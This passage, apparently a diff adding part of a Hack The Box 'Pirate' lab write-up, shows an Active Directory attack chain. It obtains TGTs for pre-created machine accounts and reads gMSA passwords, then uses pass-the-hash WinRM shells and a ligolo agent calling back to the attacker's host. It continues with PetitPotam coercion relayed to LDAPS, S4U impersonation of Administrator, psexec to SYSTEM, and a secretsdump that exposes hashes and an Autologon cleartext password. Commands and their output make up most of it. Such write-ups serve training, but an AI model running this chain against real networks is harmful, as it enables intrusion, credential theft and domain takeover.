+<pre><code class="lang-bash">nxc ldap DC01.pirate.htb -u pentest -p 'p3nt3st2025!&amp;' -M pre2k
+</code></pre>
+<pre><code>LDAP        10.129.116.1    389    DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:pirate.htb) (signing:None) (channel binding:Never) 
+LDAP        10.129.116.1    389    DC01             [+] pirate.htb\pentest:p3nt3st2025!&amp; 
+PRE2K       10.129.116.1    389    DC01             Pre-created computer account: MS01$
+PRE2K       10.129.116.1    389    DC01             Pre-created computer account: EXCH01$
+PRE2K       10.129.116.1    389    DC01             [+] Found 2 pre-created computer accounts. Saved to /home/z1rov/.nxc/modules/pre2k/pirate.htb/precreated_computers.txt
+PRE2K       10.129.116.1    389    DC01             [+] Successfully obtained TGT for ms01@pirate.htb
+PRE2K       10.129.116.1    389    DC01             [+] Successfully obtained TGT for exch01@pirate.htb
+PRE2K       10.129.116.1    389    DC01             [+] Successfully obtained TGT for 2 (pre-created) computer accounts. Saved to /home/z1rov/.nxc/modules/pre2k/ccache
+</code></pre>
+<p>Both <code>MS01$</code> and <code>EXCH01$</code> match, and a TGT is issued for each using the default lowercase password. The module goes through Kerberos rather than SMB deliberately: a direct SMB logon attempt against a machine account is rejected with <code>STATUS_NOLOGON_WORKSTATION_TRUST_ACCOUNT</code>, since that account type isn't permitted an interactive SMB session regardless of credential validity. A Kerberos AS-REQ for a TGT isn't subject to that account-type restriction, so it succeeds where SMB would not — though the KDC still enforces its own checks (account state, time skew, pre-auth requirements) beyond just matching the password.</p>
+<pre><code class="lang-bash">export KRB5CCNAME=/home/z1rov/.nxc/modules/pre2k/ccache/exch01.ccache
+klist
+</code></pre>
+<pre><code>Ticket cache: FILE:/home/z1rov/.nxc/modules/pre2k/ccache/exch01.ccache
+Default principal: exch01@PIRATE.HTB
+
+Valid starting       Expires              Service principal
+09/05/2026 22:53:51  09/06/2026 08:53:51  krbtgt/PIRATE.HTB@PIRATE.HTB
+	renew until 09/06/2026 10:53:25
+</code></pre>
+<p><code>EXCH01$</code> doesn't lead anywhere further, so the chain continues with <code>MS01$ : ms01</code>.</p>
+<h3>Attack path mapping</h3>
+<pre><code class="lang-bash">bloodhound-ce.py -d pirate.htb -u pentest -p 'p3nt3st2025!&amp;' -ns 10.129.116.1 -dc dc01.pirate.htb -c All --zip -op pirate
+</code></pre>
+<pre><code>INFO: BloodHound.py for BloodHound Community Edition
+INFO: Found AD domain: pirate.htb
+INFO: Getting TGT for user
+INFO: Connecting to LDAP server: dc01.pirate.htb
+INFO: Found 1 domains
+INFO: Found 1 domains in the forest
+INFO: Found 4 computers
+INFO: Connecting to LDAP server: dc01.pirate.htb
+INFO: Connecting to GC LDAP server: dc01.pirate.htb
+INFO: Found 10 users
+INFO: Found 54 groups
+INFO: Found 2 gpos
+INFO: Found 1 ous
+INFO: Found 20 containers
+INFO: Found 0 trusts
+INFO: Starting computer enumeration with 10 workers
+INFO: Querying computer: 
+INFO: Querying computer: 
+INFO: Querying computer: WEB01.pirate.htb
+INFO: Querying computer: DC01.pirate.htb
+INFO: Done in 00M 35S
+INFO: Compressing output into 20260905093812_bloodhound.zip
+</code></pre>
+<p>This collection is where <code>WEB01</code> first appears — it becomes the target of the second half of the chain. Pathing from <code>MS01</code> shows it belongs to a non-default group, <strong><code>Domain Secure Servers</code></strong>, which has been granted <strong><code>ReadGMSAPassword</code></strong> over two Group Managed Service Accounts:</p>
+<ul>
+<li><code>GMSA_ADFS_PROD$@PIRATE.HTB</code></li>
+<li><code>GMSA_ADCS_PROD$@PIRATE.HTB</code></li>
+</ul>
+<img src="https://img.zirov.net/pirate-htb/21263184028838495070.png" alt="BloodHound path: MS01 → Domain Secure Servers → ReadGMSAPassword → gMSA ADFS/ADCS" />
+<p>A gMSA's password should only be readable by the specific hosts or accounts listed in its <code>PrincipalsAllowedToRetrieveManagedPassword</code> property, decoded directly from <code>msDS-ManagedPassword</code> in LDAP — no cracking needed. Putting a workstation-level account like <code>MS01$</code> into that group is an over-broad grant, given that these two accounts (<code>ADCS</code>, <code>ADFS</code>) back the domain's certificate and federation services.</p>
+<h2>Exploitation</h2>
+<h3>gMSA secrets</h3>
+<pre><code class="lang-bash">nxc ldap DC01.pirate.htb -u 'MS01$' -p 'ms01' --gmsa -k
+</code></pre>
+<pre><code>LDAP        DC01.pirate.htb 389    DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:pirate.htb) (signing:None) (channel binding:Never) 
+LDAP        DC01.pirate.htb 389    DC01             [+] pirate.htb\MS01$:ms01 
+LDAP        DC01.pirate.htb 389    DC01             [*] Getting GMSA Passwords
+LDAP        DC01.pirate.htb 389    DC01             Account: gMSA_ADCS_prod$      NTLM: aa831d274ee80cf2092f68cbcf29093e     PrincipalsAllowedToReadPassword: Domain Secure Servers
+LDAP        DC01.pirate.htb 389    DC01             Account: gMSA_ADCS_prod$      aes128-cts-hmac-sha1-96: 5a174fa34293c0eb347407e7ba3e12fa
+LDAP        DC01.pirate.htb 389    DC01             Account: gMSA_ADCS_prod$      aes256-cts-hmac-sha1-96: 5ca2fd1275281f9ce37bd4db8dcc01637edf176067cb35b55b7c70c30c9cd82f
+LDAP        DC01.pirate.htb 389    DC01             Account: gMSA_ADFS_prod$      NTLM: e819498ec29f595382df1eaf4fb42307     PrincipalsAllowedToReadPassword: Domain Secure Servers
+LDAP        DC01.pirate.htb 389    DC01             Account: gMSA_ADFS_prod$      aes128-cts-hmac-sha1-96: b3bedca3542b1a3427a572f9640c14de
+LDAP        DC01.pirate.htb 389    DC01             Account: gMSA_ADFS_prod$      aes256-cts-hmac-sha1-96: 8780bab067a723428b720443f13e698c5f959f7546f2193a6b094fd40f992fdc
+</code></pre>
+<p>Matches BloodHound's graph exactly.</p>
+<p><strong>Credentials found:</strong> <code>gMSA_ADCS_prod$ : aa831d274ee80cf2092f68cbcf29093e</code> (NTLM) · <code>gMSA_ADFS_prod$ : e819498ec29f595382df1eaf4fb42307</code> (NTLM)</p>
+<h3>Remote shell</h3>
+<pre><code class="lang-bash">nxc winrm DC01.pirate.htb -u 'gMSA_ADFS_prod$' -H 'e819498ec29f595382df1eaf4fb42307'
+</code></pre>
+<pre><code>WINRM       10.129.116.1    5985   DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:pirate.htb) 
+WINRM       10.129.116.1    5985   DC01             [+] pirate.htb\gMSA_ADFS_prod$:e819498ec29f595382df1eaf4fb42307 (Pwn3d!)
+</code></pre>
+<pre><code class="lang-bash">nxc winrm DC01.pirate.htb -u 'gMSA_ADCS_prod$' -H 'aa831d274ee80cf2092f68cbcf29093e'
+</code></pre>
+<pre><code>WINRM       10.129.116.1    5985   DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:pirate.htb) 
+WINRM       10.129.116.1    5985   DC01             [+] pirate.htb\gMSA_ADCS_prod$:aa831d274ee80cf2092f68cbcf29093e (Pwn3d!)
+</code></pre>
+<p>Both gMSAs can open a WinRM session on the DC — itself unusual, since these accounts are meant to run services, not log in interactively:</p>
+<pre><code class="lang-bash">evil-winrm -i DC01.pirate.htb -u 'gMSA_ADCS_prod$' -H 'aa831d274ee80cf2092f68cbcf29093e'
+</code></pre>
+<pre><code>Evil-WinRM shell v3.9
+Info: Establishing connection to remote endpoint
+*Evil-WinRM* PS C:\Users\gMSA_ADCS_prod$\Documents&gt; whoami
+pirate\gmsa_adcs_prod$
+</code></pre>
+<h3>Internal hosts</h3>
+<pre><code class="lang-powershell">Get-ADComputer -Filter * | Select-Object Name
+</code></pre>
+<pre><code>Name
+----
+DC01
+WEB01
+MS01
+EXCH01
+</code></pre>
+<pre><code class="lang-powershell">ping WEB01
+</code></pre>
+<pre><code>Pinging web01.pirate.htb [192.168.100.2] with 32 bytes of data:
+Reply from 192.168.100.2: bytes=32 time=1ms TTL=128
+Reply from 192.168.100.2: bytes=32 time&lt;1ms TTL=128
+Reply from 192.168.100.2: bytes=32 time&lt;1ms TTL=128
+Reply from 192.168.100.2: bytes=32 time&lt;1ms TTL=128
+
+Ping statistics for 192.168.100.2:
+    Packets: Sent = 4, Received = 4, Lost = 0 (0% loss),
+Approximate round trip times in milli-seconds:
+    Minimum = 0ms, Maximum = 1ms, Average = 0ms
+</code></pre>
+<p><code>WEB01</code> sits on <code>192.168.100.0/24</code>, unreachable from our attack box directly — a pivot through the dual-homed DC is needed.</p>
+<h3>Pivoting</h3>
+<pre><code class="lang-bash">upload /opt/tools/forja/ligolo/ligolo-agent_windows_amd64.exe
+</code></pre>
+<pre><code>Info: Uploading /opt/tools/forja/ligolo/ligolo-agent_windows_amd64.exe to C:\Users\gMSA_ADCS_prod$\Documents\ligolo-agent_windows_amd64.exe
+                                        
+Data: 9831764 bytes of 9831764 bytes copied
+                                        
+Info: Upload successful!
+</code></pre>
+<pre><code class="lang-bash">sudo ip tuntap add user $(whoami) mode tun ligolo
+sudo ip link set ligolo up
+sudo ip route add 192.168.100.0/24 dev ligolo
+ligolo-proxy -selfcert
+</code></pre>
+<pre><code class="lang-powershell">.\ligolo-agent_windows_amd64.exe -connect 10.10.15.30:11601 -ignore-cert
+</code></pre>
+<pre><code>ligolo-ng » session
+? Specify a session : 1 - PIRATE\gMSA_ADCS_prod$@DC01 - 10.129.116.1:56347 - 00155d0bd000
+[Agent : PIRATE\gMSA_ADCS_prod$@DC01] » start
+INFO[0019] Starting tunnel to PIRATE\gMSA_ADCS_prod$@DC01 (00155d0bd000) 
+</code></pre>
+<pre><code class="lang-bash">ping -c 1 192.168.100.2
+</code></pre>
+<pre><code>PING 192.168.100.2 (192.168.100.2) 56(84) bytes of data.
+64 bytes from 192.168.100.2: icmp_seq=1 ttl=64 time=146 ms
+
+--- 192.168.100.2 ping statistics ---
+1 packets transmitted, 1 received, 0% packet loss, time 0ms
+rtt min/avg/max/mdev = 146.176/146.176/146.176/0.000 ms
+</code></pre>
+<pre><code class="lang-bash">echo '192.168.100.2 WEB01.pirate.htb' | sudo tee -a /etc/hosts
+</code></pre>
+<h3>Scanning WEB01</h3>
+<pre><code class="lang-bash">sudo nmap -p- --open -sS --min-rate 5000 -Pn -n -T4 WEB01.pirate.htb -oX scan.xml
+</code></pre>
+<pre><code>Starting Nmap 7.95 ( https://nmap.org ) at 2026-09-06 00:04 UTC
+Nmap scan report for WEB01.pirate.htb (192.168.100.2)
+Host is up (0.20s latency).
+Not shown: 65526 filtered tcp ports (no-response)
+Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
+PORT      STATE SERVICE
+80/tcp    open  http
+135/tcp   open  msrpc
+139/tcp   open  netbios-ssn
+445/tcp   open  microsoft-ds
+49664/tcp open  unknown
+49665/tcp open  unknown
+49686/tcp open  unknown
+49687/tcp open  unknown
+49707/tcp open  unknown
+
+Nmap done: 1 IP address (1 host up) scanned in 53.52 seconds
+</code></pre>
+<p>No DNS, Kerberos or LDAP ports — <code>WEB01</code> is a regular member server, not another DC.</p>
+<pre><code class="lang-bash">nmap -p80,135,139,445,49664,49665,49686,49687,49707 -sCV WEB01.pirate.htb -oN info_192.168.100.2
+</code></pre>
+<pre><code>Starting Nmap 7.95 ( https://nmap.org ) at 2026-09-06 00:08 UTC
+Nmap scan report for WEB01.pirate.htb (192.168.100.2)
+Host is up (0.19s latency).
+
+PORT      STATE SERVICE       VERSION
+80/tcp    open  http          Microsoft IIS httpd 10.0
+|_http-title: IIS Windows Server
+|_http-server-header: Microsoft-IIS/10.0
+| http-methods: 
+|_  Potentially risky methods: TRACE
+135/tcp   open  msrpc         Microsoft Windows RPC
+139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
+445/tcp   open  microsoft-ds?
+49664/tcp open  msrpc         Microsoft Windows RPC
+49665/tcp open  msrpc         Microsoft Windows RPC
+49686/tcp open  msrpc         Microsoft Windows RPC
+49687/tcp open  msrpc         Microsoft Windows RPC
+49707/tcp open  msrpc         Microsoft Windows RPC
+Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
+
+Host script results:
+|_clock-skew: 25s
+| smb2-time: 
+|   date: 2026-09-06T00:09:53
+|_  start_date: N/A
+| smb2-security-mode: 
+|   3:1:1: 
+|_    Message signing enabled but not required
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 96.89 seconds
+</code></pre>
+<p>SMB signing here is enabled but not required — the setting the next stage depends on.</p>
+<h3>Coercion and relay</h3>
+<pre><code class="lang-bash">nxc smb WEB01.pirate.htb -u 'pentest' -p 'p3nt3st2025!&amp;' -M coerce_plus
+</code></pre>
+<pre><code>SMB         192.168.100.2   445    WEB01            [*] Windows 10 / Server 2019 Build 17763 x64 (name:WEB01) (domain:pirate.htb) (signing:False) (SMBv1:False)
+SMB         192.168.100.2   445    WEB01            [+] pirate.htb\pentest:p3nt3st2025!&amp; 
+COERCE_PLUS 192.168.100.2   445    WEB01            VULNERABLE, PetitPotam
+COERCE_PLUS 192.168.100.2   445    WEB01            VULNERABLE, PrinterBug
+COERCE_PLUS 192.168.100.2   445    WEB01            VULNERABLE, PrinterBug
+COERCE_PLUS 192.168.100.2   445    WEB01            VULNERABLE, MSEven
+</code></pre>
+<p>Several coercion primitives are available; we proceed with PetitPotam, which abuses <code>MS-EFSRPC</code> to force <code>WEB01$</code> to authenticate to a host we control. Paired with unsigned SMB, that authentication can be relayed live to a different protocol instead of just captured.</p>
+<p>The relay listener goes up first. Targeting <code>ldaps://</code> with <code>--delegate-access</code> tells <code>ntlmrelayx</code> to create a new computer account and grant it constrained delegation over whatever machine authenticates:</p>
+<pre><code class="lang-bash">sudo ntlmrelayx.py -t ldaps://dc01.pirate.htb --delegate-access --remove-mic -smb2support
+</code></pre>
+<pre><code class="lang-bash">PetitPotam.py 10.10.15.30 WEB01.pirate.htb -u 'gMSA_ADCS_prod$' -hashes :aa831d274ee80cf2092f68cbcf29093e
+</code></pre>
+<pre><code>Impacket v0.14.0.dev0+20260828.120813.032dfb1b - Copyright Fortra, LLC and its affiliated companies 
+
+[*] Protocol Client LDAPS loaded..
+[*] Protocol Client LDAP loaded..
+[*] Protocol Client SMB loaded..
+[*] Protocol Client HTTPS loaded..
+[*] Protocol Client HTTP loaded..
+[*] Protocol Client DCSYNC loaded..
+[*] Protocol Client IMAP loaded..
+[*] Protocol Client IMAPS loaded..
+[*] Protocol Client WINRMS loaded..
+[*] Protocol Client MSSQL loaded..
+[*] Protocol Client SMTP loaded..
+[*] Protocol Client RPC loaded..
+[*] Running in relay mode to single host
+[*] Setting up SMB Server on port 445
+[*] Setting up HTTP Server on port 80
+[*] Setting up WCF Server on port 9389
+[*] Setting up RAW Server on port 6666
+[*] Setting up WinRM (HTTP) Server on port 5985
+[*] Setting up WinRMS (HTTPS) Server on port 5986
+[*] Setting up RPC Server on port 135
+[*] Setting up MSSQL Server on port 1433
+[*] Setting up RDP Server on port 3389
+[*] Multirelay disabled
+
+[*] Servers started, waiting for connections
+[*] (SMB): Received connection from 10.129.116.1, attacking target ldaps://dc01.pirate.htb
+[*] (SMB): Authenticating connection from PIRATE/WEB01$@10.129.116.1 against ldaps://dc01.pirate.htb SUCCEED [1]
+[*] ldaps://PIRATE/WEB01$@dc01.pirate.htb [1] -&gt; Enumerating relayed user's privileges. This may take a while on large domains
+[*] All targets processed!
+[*] (SMB): Connection from 10.129.116.1 controlled, but there are no more targets left!
+[*] ldaps://PIRATE/WEB01$@dc01.pirate.htb [1] -&gt; Attempting to create computer in: CN=Computers,DC=pirate,DC=htb
+[*] ldaps://PIRATE/WEB01$@dc01.pirate.htb [1] -&gt; Adding new computer with username: COSHMPED$ and password: (UKd426CZp0M8tZ result: OK
+[*] ldaps://PIRATE/WEB01$@dc01.pirate.htb [1] -&gt; Delegation rights modified succesfully!
+[*] ldaps://PIRATE/WEB01$@dc01.pirate.htb [1] -&gt; COSHMPED$ can now impersonate users on WEB01$ via S4U2Proxy
+</code></pre>
+<p><code>WEB01$</code> authenticated to the fake LDAPS listener, and <code>ntlmrelayx</code> used that session to create <code>COSHMPED$</code> and grant it constrained delegation over <code>WEB01</code>. The PetitPotam side confirms the coercion landed:</p>
+<pre><code>Trying pipe lsarpc
+[-] Connecting to ncacn_np:web01.pirate.htb[\PIPE\lsarpc]
+[+] Connected!
+[+] Binding to c681d488-d850-11d0-8c52-00c04fd90f7e
+[+] Successfully bound!
+[-] Sending EfsRpcOpenFileRaw!
+[-] Got RPC_ACCESS_DENIED!! EfsRpcOpenFileRaw is probably PATCHED!
+[+] OK! Using unpatched function!
+[-] Sending EfsRpcEncryptFileSrv!
+[+] Got expected ERROR_BAD_NETPATH exception!!
+[+] Attack worked!
+</code></pre>
+<p>The primary method is patched, but PetitPotam's fallback (<code>EfsRpcEncryptFileSrv</code>) still works; the <code>ERROR_BAD_NETPATH</code> at the end is expected once coercion has already succeeded.</p>
+<p><strong>Account obtained:</strong> <code>COSHMPED$ : (UKd426CZp0M8tZ</code> — constrained delegation over <code>WEB01$</code>.</p>
+<h3>Impersonating Administrator</h3>
+<pre><code class="lang-bash">getST.py -spn 'cifs/WEB01.pirate.htb' -impersonate Administrator -dc-ip dc01.pirate.htb 'pirate.htb/COSHMPED$:(UKd426CZp0M8tZ'
+</code></pre>
+<pre><code>Impacket v0.14.0.dev0+20260828.120813.032dfb1b - Copyright Fortra, LLC and its affiliated companies 
+
+[-] CCache file is not found. Skipping...
+[*] Getting TGT for user
+[*] Impersonating Administrator
+[*] Requesting S4U2self
+[*] Requesting S4U2Proxy
+[*] Saving ticket in Administrator@cifs_WEB01.pirate.htb@PIRATE.HTB.ccache
+</code></pre>
+<pre><code class="lang-bash">export KRB5CCNAME=Administrator@cifs_WEB01.pirate.htb@PIRATE.HTB.ccache
+klist
+</code></pre>
+<pre><code>Ticket cache: FILE:Administrator@cifs_WEB01.pirate.htb@PIRATE.HTB.ccache
+Default principal: Administrator@pirate.htb
+
+Valid starting       Expires              Service principal
+09/06/2026 00:14:53  09/06/2026 10:14:52  cifs/WEB01.pirate.htb@PIRATE.HTB
+	renew until 09/07/2026 00:14:26
+</code></pre>
+<pre><code class="lang-bash">psexec.py -k -no-pass pirate.htb/Administrator@WEB01.pirate.htb
+</code></pre>
+<pre><code>Impacket v0.14.0.dev0+20260828.120813.032dfb1b - Copyright Fortra, LLC and its affiliated companies 
+
+[*] Requesting shares on WEB01.pirate.htb.....
+[*] Found writable share ADMIN$
+[*] Uploading file vdbZsgUU.exe
+[*] Opening SVCManager on WEB01.pirate.htb.....
+[*] Creating service Cuzj on WEB01.pirate.htb.....
+[*] Starting service Cuzj.....
+
+C:\WINDOWS\system32&gt; whoami
+nt authority\system
+</code></pre>
+<pre><code class="lang-powershell">powershell
+hostname ; whoami ; ipconfig ; type user.txt
+</code></pre>
+<pre><code>WEB01
+nt authority\system
+
+Windows IP Configuration
+
+Ethernet adapter Ethernet 2:
+   IPv4 Address. . . . . . . . . . . : 192.168.100.2
+   Subnet Mask . . . . . . . . . . . : 255.255.255.0
+   Default Gateway . . . . . . . . . : 192.168.100.1
+80eae9b6b609325e66dd45cd9bc5****
+</code></pre>
+<h2>Lateral Movement</h2>
+<h3>Credential dump</h3>
+<pre><code class="lang-bash">secretsdump.py -k -no-pass pirate.htb/Administrator@WEB01.pirate.htb
+</code></pre>
+<pre><code>Impacket v0.14.0.dev0+20260828.120813.032dfb1b - Copyright Fortra, LLC and its affiliated companies 
+
+[*] Service RemoteRegistry is in stopped state
+[*] Starting service RemoteRegistry
+[*] Target system bootKey: 0x342dfe90cc4061078b79f011cd08f931
+[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:b1aac1584c2ea8ed0a9429684e4fc3e5:::
+Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:60da2d3ba00d6b5932e4c87dce6fa6b4:::
+[*] Dumping cached domain logon information (domain/username:hash)
+PIRATE.HTB/Administrator:$DCC2$10240#Administrator#8baf09ddc5830ac4456ee8639dd89644: (2026-02-25 02:41:09+00:00)
+PIRATE.HTB/gMSA_ADFS_prod$:$DCC2$10240#gMSA_ADFS_prod$#66812dfee46ff41c9c8245a2819c3183: (2026-09-05 21:55:24+00:00)
+PIRATE.HTB/a.white:$DCC2$10240#a.white#366c8924be3ea6d1d12825569a4bcc39: (2026-09-05 21:53:19+00:00)
+[*] Dumping LSA Secrets
+[*] $MACHINE.ACC 
+PIRATE\WEB01$:aes256-cts-hmac-sha1-96:57b48ef53425adf16b2409ea4d980de1007c9f61b126bdc1c05d3d830c727526
+PIRATE\WEB01$:aes128-cts-hmac-sha1-96:b6b018d4edd476f0999d6f666844cf77
+PIRATE\WEB01$:des-cbc-md5:efdf97b9a1e06243
+PIRATE\WEB01$:plain_password_hex:29f1505d87014b01b4317fed1d52ddbee2792a698e7e1de1bcdf29ab5d4b8e54828ce470d23491ba84e82d786622a821a14c730cf8610a32db1951b7619ee08c3bcacbab53aac8e052bd64e638c6bbd9529daacf04f86cfb9034808c4378d2c328c8c6afe7655f4a099dc41caeb6279c53313edcbd58db3e14490b7543ba3250ac200ec9834992b61b3f4319162645b50f402de4db0843fc43db7d54e04828abf86e490959bc88670e50f0b50373a3745f70039f8fd032435c4a725526957c7ae0dbaa81273b3aa28c0b029fea90c271b6601ef3ba7a05a13ec8c8ffd9999dd10eee87b4b9eb08a8a4af90710056f558
+PIRATE\WEB01$:aad3b435b51404eeaad3b435b51404ee:feba09cf0013fbf5834f50def734bca9:::
+[*] DefaultPassword 
+PIRATE\a.white:E2nvAOKSz5Xz2MJu
+[*] DPAPI_SYSTEM 
+dpapi_machinekey:0x01cffc2ef9a91d20107371f9a4a4112c892ed989
+dpapi_userkey:0xa4fddb1b2df2db7cc3d044dc1b559bc1b45a1de9
+[*] NL$KM 
+ 0000   A5 24 39 57 3F 8F 30 DC  61 F1 56 B7 B5 5C 0F 7C   .$9W?.0.a.V..\.|
+ 0010   6B 0A FF DF B0 A2 99 C3  68 A9 FE 15 E2 48 33 A9   k.......h....H3.
+ 0020   E9 8C 27 F8 8B 7C 05 55  4D FE 3C 5D 09 EA 9C 49   ..'..|.UM.&lt;]...I
+ 0030   95 EB 7A 09 5B 48 7A 14  DC 74 E9 CB 7C 1A E0 8A   ..z.[Hz..t..|...
+NL$KM:a52439573f8f30dc61f156b7b55c0f7c6b0affdfb0a299c368a9fe15e24833a9e98c27f88b7c05554dfe3c5d09ea9c4995eb7a095b487a14dc74e9cb7c1ae08a
+[*] _SC_GMSA_DPAPI_{C6810348-4834-4a1e-817D-5838604E6004}_a09ca32bc7cd2ce752ae0143bd203f0551564c04dd2846c4ed3e4e5a61cc9f11 
+ 0000   E3 EF 47 4B 98 13 8D D4  46 9F 6D C1 76 F8 79 BA   ..GK....F.m.v.y.
+ 0010   1E 08 17 BA 44 50 21 87  B9 08 0B 9F 33 34 C9 1B   ....DP!.....34..
+ 0020   9B 1A F1 CE 4E 91 FB 56  2C 8D 88 24 41 2C 70 0E   ....N..V,..$A,p.
+ 0030   00 D1 05 BC 67 4D 8E 26  A5 94 E3 DA 41 73 F2 C8   ....gM.&amp;....As..
+ 0040   73 13 D6 34 B3 9C 34 12  D4 BF B6 84 92 47 68 6D   s..4..4......Ghm
+ 0050   F6 06 5B 53 65 66 80 7E  0A CE 92 F9 4E A3 16 6B   ..[Sef.~....N..k
+ 0060   B9 75 2D 12 D3 52 C8 9B  9F DA FA 7D 31 71 E4 DD   .u-..R.....}1q..
+ 0070   55 BE 9D 58 55 04 F8 C6  28 A0 FF 4C 67 0D 75 95   U..XU...(..Lg.u.
+ 0080   A9 09 A3 C9 A7 EC 2D FF  98 4E 5D DF 77 04 9A 91   ......-..N].w...
+ 0090   A5 59 7F 0A 39 C5 49 94  55 67 59 01 CC E4 1A DE   .Y..9.I.UgY.....
+ 00a0   D9 8D 80 A1 B5 F7 F8 2C  C2 20 B5 90 DF 4B FC 0B   .......,. ...K..
+ 00b0   FC 5F 0F EB 66 E7 3A 56  F1 AB 7F E9 14 C6 D7 CD   ._..f.:V........
+ 00c0   2B 83 E0 B9 06 5B 76 E0  2B C3 30 F7 69 44 16 F3   +....[v.+.0.iD..
+ 00d0   AC D6 C4 63 DF 84 92 35  00 B6 4A 10 14 E7 44 13   ...c...5..J...D.
+ 00e0   80 9A 7A 06 AF 57 7C E7  68 5B FD 2A B5 6A 20 67   ..z..W|.h[.*.j g
+_SC_GMSA_DPAPI_{C6810348-4834-4a1e-817D-5838604E6004}_a09ca32bc7cd2ce752ae0143bd203f0551564c04dd2846c4ed3e4e5a61cc9f11:e3ef474b98138dd4469f6dc176f879ba1e0817ba44502187b9080b9f3334c91b9b1af1ce4e91fb562c8d8824412c700e00d105bc674d8e26a594e3da4173f2c87313d634b39c3412d4bfb6849247686df6065b536566807e0ace92f94ea3166bb9752d12d352c89b9fdafa7d3171e4dd55be9d585504f8c628a0ff4c670d7595a909a3c9a7ec2dff984e5ddf77049a91a5597f0a39c5499455675901cce41aded98d80a1b5f7f82cc220b590df4bfc0bfc5f0feb66e73a56f1ab7fe914c6d7cd2b83e0b9065b76e02bc330f7694416f3acd6c463df84923500b64a1014e74413809a7a06af577ce7685bfd2ab56a2067
+[*] _SC_GMSA_{84A78B8C-56EE-465b-8496-FFB35A1B52A7}_a09ca32bc7cd2ce752ae0143bd203f0551564c04dd2846c4ed3e4e5a61cc9f11 
+ 0000   01 00 00 00 22 01 00 00  10 00 00 00 12 01 1A 01   ....&quot;...........
+ 0010   B6 C4 08 39 11 A2 83 50  B1 FD 69 48 80 36 50 E1   ...9...P..iH.6P.
+ 0020   B1 C5 74 1F 77 19 B1 F4  FF 92 62 03 DC DF 4E C9   ..t.w.....b...N.
+ 0030   C0 36 9B 7B 92 FE 10 A2  D7 FF 95 3B FA 40 6A 3B   .6.{.......;.@j;
+ 0040   67 86 52 3E D8 27 67 CC  8F E2 73 4A F8 92 E9 8E   g.R&gt;.'g...sJ....
+ 0050   FB EF 2B 34 76 75 90 32  B4 EC DE F3 42 76 C3 63   ..+4vu.2....Bv.c
+ 0060   B8 A9 41 0B 63 D8 09 EA  6E F1 67 F5 B5 41 D7 3C   ..A.c...n.g..A.&lt;
+ 0070   3A C4 21 4D A2 2A 14 D9  79 82 C9 28 D9 1B B9 71   :.!M.*..y..(...q
+ 0080   FE 99 D4 80 9C 1E BD EA  E8 E7 69 C6 B3 37 7E E1   ..........i..7~.
+ 0090   A4 78 DF FB B2 DD C1 33  18 BE 13 11 67 D1 A4 A0   .x.....3....g...
+ 00a0   18 33 A4 C2 7E 05 12 69  0D 73 DE 1E 59 A0 17 61   .3..~..i.s..Y..a
+ 00b0   EC 7D 40 FC 18 82 05 0C  BF 43 9D 9C BB 28 1A 06   .}@......C...(..
+ 00c0   D4 BF 8D 85 D1 FE B2 74  0E C3 99 EC A0 E4 6E 36   .......t......n6
+ 00d0   99 0B 72 B2 C4 A6 4A E0  09 BA FB 3D FD 26 4F F7   ..r...J....=.&amp;O.
+ 00e0   34 B6 3F B9 22 60 9E 8C  30 58 83 A7 5D 9A EF 75   4.?.&quot;`..0X..]..u
+ 00f0   CE 37 BC A0 91 04 36 59  0D 93 12 FC A4 6A D8 9A   .7....6Y.....j..
+ 0100   61 A8 9B DD C8 73 19 7D  E4 8E AB 3D 69 B9 E4 98   a....s.}...=i...
+ 0110   00 00 19 41 B0 1B 73 17  00 00 19 E3 DF 68 72 17   ...A..s......hr.
+ 0120   00 00                                              ..
+_SC_GMSA_{84A78B8C-56EE-465b-8496-FFB35A1B52A7}_a09ca32bc7cd2ce752ae0143bd203f0551564c04dd2846c4ed3e4e5a61cc9f11:01000000220100001000000012011a01b6c4083911a28350b1fd6948803650e1b1c5741f7719b1f4ff926203dcdf4ec9c0369b7b92fe10a2d7ff953bfa406a3b6786523ed82767cc8fe2734af892e98efbef2b3476759032b4ecdef34276c363b8a9410b63d809ea6ef167f5b541d73c3ac4214da22a14d97982c928d91bb971fe99d4809c1ebdeae8e769c6b3377ee1a478dffbb2ddc13318be131167d1a4a01833a4c27e0512690d73de1e59a01761ec7d40fc1882050cbf439d9cbb281a06d4bf8d85d1feb2740ec399eca0e46e36990b72b2c4a64ae009bafb3dfd264ff734b63fb922609e8c305883a75d9aef75ce37bca0910436590d9312fca46ad89a61a89bddc873197de48eab3d69b9e49800001941b01b7317000019e3df6872170000
+[*] Cleaning up... 
+[*] Stopping service RemoteRegistry
+</code></pre>
+<p>The <code>DefaultPassword</code> LSA secret is what matters — Windows Autologon stores the account's password there in cleartext to log it in automatically at boot. The cached <code>$DCC2$</code> hashes and gMSA/DPAPI blobs are only useful offline and don't add anything we don't already have.</p>
+<p><strong>Credentials found:</strong> <code>a.white : E2nvAOKSz5Xz2MJu</code> — cleartext password leaked via Autologon.</p>
+<h2>Privilege Escalation</h2>
+<h3>Escalation path</h3>
+<p>Reloading BloodHound with <code>a.white</code>'s credentials shows a path that wasn't visible before: <code>a.white</code> holds <code>WriteSPN</code> directly on the <code>DC01</code> computer object.</p>
+<img src="https://img.zirov.net/pirate-htb/77046666403513015650.png" alt="BloodHound path from a.white to the domain" />
